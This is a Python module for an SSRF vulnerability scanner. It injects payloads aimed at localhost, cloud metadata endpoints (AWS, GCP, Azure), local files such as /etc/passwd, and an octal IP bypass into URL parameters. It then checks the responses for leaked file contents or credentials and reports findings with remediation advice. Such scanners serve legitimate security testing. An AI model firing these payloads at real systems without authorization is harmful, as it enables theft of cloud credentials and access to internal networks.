"""SSRF Scanner — server-side request forgery detection.

Tests for internal network access, cloud metadata, and file:// protocol.
"""

import re
from typing import List
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

from .findings import Finding
from ..core.ratelimit import get_limiter


class SSRFScanner:
    """SSRF vulnerability scanner."""

    NAME = "ssrf"

    PAYLOADS = [
        ("http://127.0.0.1", "localhost", "Localhost access"),
        ("http://localhost", "localhost", "Localhost access"),
        ("http://0.0.0.0", "all-interfaces", "All interfaces access"),
        ("http://169.254.169.254/latest/meta-data/", "aws-metadata", "AWS metadata endpoint"),
        ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata", "GCP metadata endpoint"),
        ("http://169.254.169.254/metadata/instance", "azure-metadata", "Azure metadata endpoint"),
        ("file:///etc/passwd", "file-read", "Local file read"),
        ("file:///c:/windows/win.ini", "file-read", "Windows file read"),
        ("http://[::1]", "ipv6-localhost", "IPv6 localhost"),
        ("http://0177.0.0.1", "octal-bypass", "Octal encoding bypass"),
    ]

    # Indicators that SSRF actually worked
    INTERNAL_INDICATORS = [
        "root:", "daemon:", "/bin/bash", "/bin/sh",  # /etc/passwd
        "ami-", "instance-id", "security-credentials",  # AWS metadata
        "computeMetadata", "project-id",  # GCP metadata
        "subscriptionId", "resourceGroups",  # Azure metadata
        "[boot loader]", "[operating systems]",  # win.ini
    ]

    def __init__(self, rps: float = 3.0):
        self.limiter = get_limiter(rps)

    def scan_url(self, url: str, params: dict = None) -> List[Finding]:
        """Test a URL for SSRF vulnerabilities."""
        try:
            import httpx
        except ImportError:
            return []

        findings = []
        parsed = urlparse(url)
        test_params = params or {k: v[0] for k, v in parse_qs(parsed.query).items()}

        if not test_params:
            # SSRF usually needs a URL-type parameter
            test_params = {"url": "http://example.com", "uri": "http://example.com",
                          "src": "http://example.com", "dest": "http://example.com",
                          "redirect": "http://example.com", "feed": "http://example.com"}

        client = httpx.Client(follow_redirects=False, timeout=10, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"})

        for param_name in test_params:
            for payload, category, desc in self.PAYLOADS:
                test_params_copy = dict(test_params)
                test_params_copy[param_name] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_params_copy)))

                self.limiter.wait(parsed.netloc)
                try:
                    resp = client.get(test_url)
                    body = resp.text

                    # Check for internal network indicators
                    for indicator in self.INTERNAL_INDICATORS:
                        if indicator in body:
                            findings.append(Finding(
                                vuln_type="Server-Side Request Forgery (SSRF)",
                                title=f"SSRF via parameter '{param_name}' — {desc}",
                                severity="CRITICAL" if "metadata" in category else "HIGH",
                                url=url,
                                parameter=param_name,
                                method="GET",
                                payload=payload,
                                evidence=f"Internal content detected: '{indicator}' in response",
                                description=f"SSRF vulnerability allows {desc}. Server made request to {payload}",
                                remediation="Validate and whitelist allowed URLs. Block internal IP ranges. Disable unnecessary URL schemes.",
                                cvss=9.1 if "metadata" in category else 7.5,
                                cwe="CWE-918",
                                tool=self.NAME,
                                verified=True,
                                confidence="HIGH",
                            ))
                            return findings

                except Exception:
                    continue

        return findings
